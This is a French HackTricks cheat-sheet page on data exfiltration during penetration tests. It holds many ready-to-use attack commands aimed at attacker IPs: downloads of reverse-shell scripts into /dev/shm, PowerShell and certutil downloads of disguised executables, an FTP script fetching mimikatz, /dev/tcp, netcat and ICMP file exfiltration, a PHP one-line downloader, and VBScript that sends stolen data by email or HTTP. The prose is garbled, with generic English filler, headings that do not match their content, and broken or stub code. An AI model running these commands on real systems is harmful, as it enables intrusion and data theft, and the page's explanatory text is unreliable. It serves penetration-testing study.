# Exfiltration

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans toute votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Domaines couramment autorisés pour exfiltrer des informations

Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être exploités

## Copier\&Coller Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.

1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.

2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms, sending data through web forms, or using file transfer protocols like FTP or SFTP.

3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encoding it in DNS queries. This method can be difficult to detect, as DNS traffic is often allowed through firewalls.

4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to embed sensitive data in innocent-looking files and exfiltrate them from a Windows system.

5. **Covert channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. Hackers can use techniques like manipulating network protocols or exploiting system vulnerabilities to create covert channels on a compromised Windows system.

It is important for system administrators and security professionals to be aware of these exfiltration techniques and take appropriate measures to detect and prevent data leaks on Windows systems.
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### Introduction

L'exfiltration de données est une étape cruciale dans le processus de piratage. Une fois qu'un attaquant a réussi à pénétrer dans un système, il doit trouver un moyen de transférer les données sensibles hors de ce système sans être détecté. L'une des méthodes couramment utilisées pour exfiltrer des données est l'utilisation du protocole HTTP.

### Méthodologie

La méthode d'exfiltration de données via HTTP consiste à envoyer les données sensibles à un serveur distant en utilisant des requêtes HTTP. Voici les étapes générales pour exfiltrer des données via HTTP :

1. **Collecte des données** : L'attaquant doit d'abord collecter les données sensibles qu'il souhaite exfiltrer. Cela peut inclure des informations telles que des mots de passe, des informations personnelles, des données financières, etc.

2. **Encodage des données** : Avant d'envoyer les données via HTTP, l'attaquant peut choisir de les encoder pour éviter la détection. Cela peut être fait en utilisant des techniques d'encodage telles que Base64 ou en utilisant des algorithmes de chiffrement.

3. **Création de la requête HTTP** : L'attaquant doit créer une requête HTTP pour envoyer les données au serveur distant. Cela peut être fait en utilisant des outils tels que cURL ou en écrivant un script personnalisé.

4. **Configuration du serveur distant** : L'attaquant doit configurer un serveur distant pour recevoir les données exfiltrées. Cela peut être un serveur Web standard ou un serveur spécialement configuré pour recevoir les données exfiltrées.

5. **Envoi des données** : L'attaquant envoie la requête HTTP contenant les données exfiltrées au serveur distant. Les données peuvent être incluses dans le corps de la requête ou dans les en-têtes, en fonction de la méthode d'exfiltration choisie.

6. **Réception des données** : Le serveur distant reçoit la requête HTTP et extrait les données exfiltrées. L'attaquant peut ensuite accéder aux données exfiltrées à partir du serveur distant.

### Outils et ressources

Il existe de nombreux outils et ressources disponibles pour faciliter l'exfiltration de données via HTTP. Certains outils populaires incluent cURL, Wget et Netcat. De plus, il existe des scripts et des frameworks personnalisés disponibles en ligne qui peuvent être utilisés pour automatiser le processus d'exfiltration de données via HTTP.

### Conclusion

L'exfiltration de données via HTTP est une méthode couramment utilisée par les attaquants pour transférer des données sensibles hors d'un système compromis. En comprenant les étapes et les outils impliqués dans ce processus, les professionnels de la sécurité peuvent mieux se préparer à détecter et à prévenir de telles attaques.
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windows is the most widely used operating system in the world, making it a prime target for hackers. In this section, we will discuss various exfiltration techniques that can be used on Windows systems.

1. **Email**: One of the simplest ways to exfiltrate data is through email. Hackers can attach sensitive files to an email and send them to an external email address. This method is relatively easy to detect, as it leaves a clear trail in the email server logs.

2. **Web-based exfiltration**: Hackers can use web-based services to exfiltrate data from a compromised Windows system. This can include uploading files to cloud storage platforms or using file transfer protocols (FTP) to transfer data to an external server.

3. **DNS tunneling**: DNS tunneling is a technique that allows hackers to bypass firewalls and exfiltrate data by encapsulating it within DNS queries. This method can be difficult to detect, as DNS traffic is typically allowed through firewalls.

4. **Steganography**: Steganography is the practice of hiding data within other files, such as images or documents. Hackers can use steganography techniques to exfiltrate data from a Windows system without raising suspicion.

5. **USB exfiltration**: Physical access to a Windows system can allow hackers to exfiltrate data using USB devices. This can be done by copying sensitive files onto a USB drive or by using specialized tools that automatically exfiltrate data when a USB device is connected.

It is important for system administrators to be aware of these exfiltration techniques and take appropriate measures to prevent data leaks. This can include implementing strong security measures, monitoring network traffic, and regularly updating and patching Windows systems.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Télécharger des fichiers

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer affichant les requêtes GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Module Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Serveur HTTPS**

An HTTPS server is a secure web server that uses the HTTPS protocol to encrypt the communication between the server and the client. This ensures that the data transmitted between the two parties is protected from eavesdropping and tampering.

To set up an HTTPS server, you will need a valid SSL/TLS certificate. This certificate is used to verify the identity of the server and establish a secure connection with the client.

There are several methods to exfiltrate data from an HTTPS server:

1. **Data Leakage through HTTP Headers**: Some HTTP headers may contain sensitive information that can be extracted by an attacker. This includes headers like `Referer`, `User-Agent`, and `Cookie`. By manipulating these headers, an attacker can leak data to an external server.

2. **Data Leakage through Response Codes**: HTTP response codes can also be used to exfiltrate data. For example, an attacker can use a custom error page to encode and transmit data in the response code.

3. **Data Leakage through Request Methods**: HTTP request methods like `GET` and `POST` can be manipulated to exfiltrate data. An attacker can encode sensitive information in the request parameters or body and send it to an external server.

4. **Data Leakage through File Uploads**: If an HTTPS server allows file uploads, an attacker can exploit this feature to exfiltrate data. By uploading a malicious file with embedded data, the attacker can retrieve the data from the server.

To prevent data exfiltration from an HTTPS server, it is important to implement proper security measures such as input validation, secure coding practices, and regular security audits. Additionally, monitoring and analyzing server logs can help detect any suspicious activity and potential data leaks.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Serveur FTP (python)

```python
import ftplib

def ftp_upload(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'rb') as file:
            ftp.storbinary('STOR ' + file_path, file)
        ftp.quit()
        print('File uploaded successfully.')
    except ftplib.all_errors as e:
        print('Error uploading file:', e)
```

Ce code Python permet de télécharger un fichier vers un serveur FTP en utilisant les informations d'identification fournies.
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Serveur FTP (NodeJS)

The FTP server is a popular method for transferring files between a client and a server over a network. In this section, we will discuss how to set up and configure an FTP server using NodeJS.

#### Installation

To install the FTP server module in NodeJS, you can use the following command:

```bash
npm install ftp-server
```

#### Configuration

To configure the FTP server, you need to create a configuration file. Here is an example of a basic configuration file:

```javascript
const FtpSrv = require('ftp-server');

const ftpServer = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  pasv_min: 3001,
  pasv_max: 3010,
  anonymous: true,
  greeting: 'Welcome to the FTP server',
  log: console.log,
});

ftpServer.on('login', ({ username, password }, resolve, reject) => {
  if (username === 'admin' && password === 'password') {
    resolve({ root: '/path/to/root' });
  } else {
    reject(new Error('Invalid username or password'));
  }
});

ftpServer.listen()
  .then(() => console.log('FTP server started'))
  .catch((err) => console.error('Error starting FTP server:', err));
```

In this configuration file, you can specify the FTP server's URL, passive mode URL, passive mode port range, whether anonymous login is allowed, the greeting message, and the root directory for authenticated users.

#### Starting the FTP Server

To start the FTP server, you can run the following command:

```bash
node ftp-server.js
```

This will start the FTP server and listen for incoming connections on the specified URL.

#### Connecting to the FTP Server

To connect to the FTP server, you can use an FTP client such as FileZilla. Enter the server's URL, username, and password to establish a connection.

Once connected, you can upload, download, and manage files on the server using the FTP client.

#### Conclusion

Setting up an FTP server using NodeJS is a straightforward process. By following the steps outlined in this section, you can easily configure and start an FTP server for file transfer purposes.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Serveur FTP (pure-ftp)

The FTP (File Transfer Protocol) server is a commonly used method for transferring files between systems over a network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.

#### Exfiltration Techniques

1. **Standard FTP**: This method involves using the FTP protocol to transfer files from the target system to an external FTP server. The attacker can leverage vulnerabilities or weak credentials to gain unauthorized access to the FTP server and exfiltrate sensitive data.

2. **FTP Bounce Attack**: In this technique, the attacker uses an FTP server as a proxy to bounce the connection to another FTP server. By exploiting a vulnerability in the FTP server, the attacker can redirect the data transfer to a different server, allowing them to exfiltrate data without directly connecting to the target system.

3. **FTP Tunneling**: This technique involves encapsulating FTP traffic within another protocol, such as SSH or SSL/TLS, to bypass network security measures. By establishing an encrypted tunnel, the attacker can exfiltrate data without being detected by network monitoring tools.

4. **Covert Channels**: Covert channels are hidden communication channels that can be used to exfiltrate data without being detected. In the context of FTP, covert channels can be created by manipulating the FTP control and data connections to transmit data in a way that appears as normal FTP traffic.

#### Countermeasures

To protect against exfiltration via FTP servers, consider implementing the following countermeasures:

- Regularly update and patch the FTP server software to address any known vulnerabilities.
- Enforce strong authentication mechanisms, such as two-factor authentication, to prevent unauthorized access to the FTP server.
- Implement network segmentation to isolate the FTP server from critical systems and sensitive data.
- Monitor network traffic for any suspicious FTP activity, such as large file transfers or unusual connection patterns.
- Use encryption protocols, such as SSL/TLS or SSH, to secure FTP traffic and prevent unauthorized interception.
- Implement intrusion detection and prevention systems (IDS/IPS) to detect and block any malicious FTP activity.

By following these countermeasures, you can enhance the security of your FTP server and mitigate the risk of data exfiltration.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Client Windows**

Le client Windows est un système d'exploitation largement utilisé, ce qui en fait une cible courante pour les attaques de piratage. Il existe plusieurs méthodes d'exfiltration de données à partir d'un client Windows compromis. Dans cette section, nous examinerons certaines de ces méthodes et les ressources associées.

#### **Méthodes génériques d'exfiltration de données**

1. **Transfert de fichiers** : Cette méthode consiste à copier les fichiers sensibles du client Windows vers un emplacement distant contrôlé par l'attaquant. Cela peut être réalisé en utilisant des protocoles de transfert de fichiers tels que FTP, SCP ou SMB.

2. **Tunneling** : Le tunneling permet de faire passer le trafic réseau à travers un canal sécurisé. Les attaquants peuvent utiliser des outils tels que SSH ou VPN pour créer un tunnel entre le client Windows compromis et un serveur contrôlé par l'attaquant. Cela permet de transférer les données exfiltrées de manière sécurisée.

3. **Stéganographie** : La stéganographie est l'art de cacher des informations sensibles à l'intérieur d'autres fichiers, tels que des images ou des documents. Les attaquants peuvent utiliser des outils de stéganographie pour dissimuler les données exfiltrées dans des fichiers apparemment innocents.

#### **Ressources utiles**

- **Outils de transfert de fichiers** : FileZilla, WinSCP, smbclient
- **Outils de tunneling** : OpenSSH, PuTTY, OpenVPN
- **Outils de stéganographie** : Steghide, OpenStego, OutGuess

Il est important de noter que l'exfiltration de données à partir d'un client Windows compromis est une activité illégale et non éthique. Ces informations sont fournies à des fins éducatives uniquement et ne doivent pas être utilisées pour des activités malveillantes.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali en tant que serveur
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ou créez un partage smb **en utilisant samba** :
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltration

Exfiltration is the process of unauthorized data transfer from a target system to an external location. This can be a critical step in a successful attack, as it allows the attacker to access and exploit sensitive information.

There are several methods that can be used for exfiltration, depending on the target system and the attacker's goals. Some common exfiltration techniques include:

1. **File Transfer Protocol (FTP)**: FTP is a standard network protocol used for transferring files between a client and a server. Attackers can use FTP to transfer stolen data from the target system to their own server.

2. **Email**: Attackers can exfiltrate data by sending it as an email attachment to a predetermined email address. This method can be effective for small amounts of data.

3. **Web-based methods**: Attackers can use web-based methods, such as uploading data to a cloud storage service or using web forms to send data to an external server.

4. **Covert channels**: Covert channels are hidden communication channels that can be used to exfiltrate data. These channels can be created using various techniques, such as steganography (hiding data within images or other files) or tunneling (encapsulating data within another protocol).

5. **DNS tunneling**: DNS tunneling involves encapsulating data within DNS queries and responses. This allows attackers to bypass firewalls and other security measures that may be in place.

To prevent exfiltration, it is important to implement strong security measures, such as network segmentation, data loss prevention (DLP) systems, and intrusion detection systems (IDS). Regular monitoring and analysis of network traffic can also help detect and prevent exfiltration attempts.

Remember, exfiltration is an illegal activity and should only be performed in controlled environments as part of a legitimate penetration testing engagement.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

L'attaquant doit avoir SSHd en cours d'exécution.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Si la victime dispose de SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) est un outil polyvalent utilisé pour l'exfiltration de données lors de tests de pénétration. Il peut être utilisé pour établir des connexions réseau, transférer des fichiers, créer des tunnels et bien plus encore. Voici quelques méthodes courantes d'exfiltration de données à l'aide de NC :

### Exfiltration de données via TCP

La méthode la plus simple consiste à utiliser NC pour établir une connexion TCP avec un serveur distant et à transférer les données via cette connexion. Voici comment procéder :

1. Sur la machine cible, exécutez la commande suivante pour envoyer les données vers le serveur distant :

   ```
   nc <adresse IP du serveur> <port> < <fichier à exfiltrer>
   ```

   Remplacez `<adresse IP du serveur>` par l'adresse IP du serveur distant et `<port>` par le port sur lequel le serveur écoute.

2. Sur le serveur distant, exécutez la commande suivante pour recevoir les données :

   ```
   nc -l -p <port> > <fichier de réception>
   ```

   Remplacez `<port>` par le port sur lequel le serveur écoute et `<fichier de réception>` par le nom du fichier dans lequel les données seront enregistrées.

### Exfiltration de données via UDP

NC peut également être utilisé pour exfiltrer des données via UDP. Voici comment procéder :

1. Sur la machine cible, exécutez la commande suivante pour envoyer les données vers le serveur distant :

   ```
   nc -u <adresse IP du serveur> <port> < <fichier à exfiltrer>
   ```

   Remplacez `<adresse IP du serveur>` par l'adresse IP du serveur distant et `<port>` par le port sur lequel le serveur écoute.

2. Sur le serveur distant, exécutez la commande suivante pour recevoir les données :

   ```
   nc -u -l -p <port> > <fichier de réception>
   ```

   Remplacez `<port>` par le port sur lequel le serveur écoute et `<fichier de réception>` par le nom du fichier dans lequel les données seront enregistrées.

### Exfiltration de données via DNS

Une autre méthode d'exfiltration de données consiste à utiliser NC pour envoyer les données via des requêtes DNS. Voici comment procéder :

1. Sur la machine cible, exécutez la commande suivante pour envoyer les données vers le serveur DNS distant :

   ```
   nc -u <adresse IP du serveur DNS> 53 < <fichier à exfiltrer>
   ```

   Remplacez `<adresse IP du serveur DNS>` par l'adresse IP du serveur DNS distant.

2. Sur le serveur DNS distant, configurez un enregistrement de type TXT pour recevoir les données exfiltrées.

### Exfiltration de données via HTTP

NC peut également être utilisé pour exfiltrer des données via des requêtes HTTP. Voici comment procéder :

1. Sur la machine cible, exécutez la commande suivante pour envoyer les données vers le serveur distant via une requête POST :

   ```
   nc <adresse IP du serveur> 80 < <fichier à exfiltrer>
   ```

   Remplacez `<adresse IP du serveur>` par l'adresse IP du serveur distant.

2. Sur le serveur distant, configurez un point de terminaison HTTP pour recevoir les données exfiltrées.

Ces méthodes d'exfiltration de données à l'aide de NC sont simples mais efficaces. Cependant, il est important de noter que l'utilisation de NC à des fins malveillantes est illégale et peut entraîner des conséquences graves.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
To download a file from the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < /dev/tcp/<victim_ip>/<port> > <local_file>
```

Replace `<victim_ip>` with the IP address of the victim's machine and `<port>` with the desired port number. `<local_file>` should be replaced with the name of the file you want to save on your local machine.

This command will read the contents of the file on the victim's machine and redirect it to the specified local file on your machine.

### Upload file to victim

To upload a file to the victim's machine using the `/dev/tcp` method, you can use the following command:

```bash
cat < <local_file> > /dev/tcp/<victim_ip>/<port>
```

Replace `<local_file>` with the name of the file you want to upload from your local machine. `<victim_ip>` should be replaced with the IP address of the victim's machine, and `<port>` should be replaced with the desired port number.

This command will read the contents of the local file and redirect it to the specified location on the victim's machine.

Remember to ensure that you have the necessary permissions and access rights to perform these actions on the victim's machine.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Télécharger un fichier sur la victime

To exfiltrate data from a victim's system, one effective method is to upload a file to the victim's machine. This allows you to transfer sensitive information from the victim's system to your own.

There are several ways to accomplish this:

1. **Web-based file upload**: If the victim's system has a web application that allows file uploads, you can leverage this functionality to upload a file containing the data you want to exfiltrate. This method is commonly used when targeting web applications or content management systems.

2. **Email attachment**: Another method is to send an email to the victim's email address with an attachment containing the data you want to exfiltrate. This can be done by exploiting vulnerabilities in the victim's email client or by tricking the victim into opening a malicious email.

3. **Remote file transfer**: If you have remote access to the victim's system, you can use tools like SCP (Secure Copy) or FTP (File Transfer Protocol) to transfer a file from the victim's machine to your own. This method requires prior access to the victim's system.

Remember to choose a method that is suitable for the victim's system and the specific circumstances of your attack.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

L'**ICMP** (Internet Control Message Protocol) est un protocole de la couche réseau utilisé pour le diagnostic et le contrôle des erreurs dans les réseaux IP. Il est couramment utilisé pour tester la connectivité entre les hôtes et pour envoyer des messages d'erreur ou de contrôle.

L'**exfiltration ICMP** est une technique utilisée par les hackers pour transférer des données sensibles d'un réseau à un autre en utilisant des paquets ICMP. Cette méthode exploite le fait que les paquets ICMP sont généralement autorisés à traverser les pare-feu et les dispositifs de sécurité réseau.

Lors de l'exfiltration ICMP, les données sont encapsulées dans les champs de données des paquets ICMP. Les hackers peuvent utiliser différentes techniques pour masquer les données exfiltrées, telles que la fragmentation des paquets ICMP ou l'utilisation de techniques de stéganographie.

Pour détecter et prévenir l'exfiltration ICMP, il est recommandé de mettre en place des règles de pare-feu qui limitent le trafic ICMP sortant et de surveiller attentivement le trafic ICMP pour détecter toute anomalie ou activité suspecte.

Il est également important de mettre en œuvre des mesures de sécurité supplémentaires, telles que le chiffrement des données sensibles et l'utilisation de solutions de détection d'intrusion, pour renforcer la protection contre l'exfiltration ICMP.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Par défaut dans XP et 2003 (dans d'autres, il doit être ajouté explicitement lors de l'installation)

Dans Kali, **démarrer le serveur TFTP** :
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Serveur TFTP en python :**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    print('TFTP server started and listening on port 69...')

    while True:
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            print(f'Read request received from {client_address[0]}:{client_address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')

            # Send file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            print(f'Write request received from {client_address[0]}:{client_address[1]}')
            print(f'Filename: {filename}')
            print(f'Mode: {mode}')

            # Receive file
            # ...

        else:
            print(f'Invalid opcode {opcode} received from {client_address[0]}:{client_address[1]}')

if __name__ == '__main__':
    tftp_server()
```

Ce code est un exemple de serveur TFTP (Trivial File Transfer Protocol) en python. Le serveur écoute sur le port 69 et peut gérer les requêtes de lecture et d'écriture.

Lorsqu'une requête de lecture est reçue, le serveur extrait le nom du fichier et le mode de transfert de la requête, puis envoie le fichier demandé au client.

Lorsqu'une requête d'écriture est reçue, le serveur extrait également le nom du fichier et le mode de transfert de la requête, puis reçoit le fichier envoyé par le client.

Si le serveur reçoit une opcode invalide, il affiche un message d'erreur.

Notez que le code pour envoyer et recevoir des fichiers n'est pas inclus dans cet exemple.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Dans **victim**, connectez-vous au serveur Kali :
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Téléchargez un fichier avec une seule ligne de code PHP :
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) est un langage de script développé par Microsoft. Il est principalement utilisé pour automatiser des tâches dans les environnements Windows. VBScript est souvent utilisé dans le contexte du piratage pour exfiltrer des données sensibles d'un système compromis.

### Méthodes d'exfiltration

#### 1. Exfiltration par e-mail

L'exfiltration par e-mail est l'une des méthodes les plus courantes utilisées pour extraire des données d'un système compromis. VBScript peut être utilisé pour envoyer des e-mails contenant les données sensibles à une adresse spécifiée. Cette méthode est souvent utilisée pour contourner les pare-feu et les systèmes de détection d'intrusion.

```vbscript
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "adresse@expediteur.com"
objEmail.To = "adresse@destinataire.com"
objEmail.Subject = "Données sensibles"
objEmail.TextBody = "Voici les données sensibles : " & sensitiveData
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "serveur_smtp"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
```

#### 2. Exfiltration par FTP

L'exfiltration par FTP est une autre méthode couramment utilisée pour transférer des données d'un système compromis vers un serveur distant. VBScript peut être utilisé pour établir une connexion FTP et transférer les données sensibles vers le serveur distant.

```vbscript
Set objFTP = CreateObject("WinSCP.Session")
objFTP.Open "utilisateur:mot_de_passe@serveur_ftp"
objFTP.PutFile "chemin_local", "chemin_distant"
objFTP.Close
```

#### 3. Exfiltration par HTTP

L'exfiltration par HTTP est une méthode utilisée pour envoyer des données sensibles à un serveur distant via le protocole HTTP. VBScript peut être utilisé pour envoyer des requêtes HTTP POST contenant les données sensibles.

```vbscript
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
objHTTP.Open "POST", "http://serveur_distant", False
objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objHTTP.send "donnees=" & sensitiveData
```

### Prévention de l'exfiltration

Pour prévenir l'exfiltration de données sensibles, il est important de mettre en place des mesures de sécurité appropriées, telles que :

- Utiliser des pare-feu et des systèmes de détection d'intrusion pour surveiller le trafic réseau sortant.
- Mettre en place des politiques de sécurité strictes pour limiter l'accès aux données sensibles.
